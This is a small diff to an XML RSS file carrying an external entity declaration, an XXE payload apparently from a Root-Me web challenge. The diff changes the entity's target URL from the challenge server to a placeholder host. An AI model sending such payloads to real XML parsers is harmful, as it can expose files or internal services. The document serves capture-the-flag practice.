@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE name [ <!ENTITY lol SYSTEM “http://challenge01.root-me.org/web-serveur/ch29/index.php”>]>
+<!DOCTYPE name [ <!ENTITY lol SYSTEM “http://host.tld/rss/index.php”>]>
 
 <channel>
   <title>W3Schools Home Page</title>
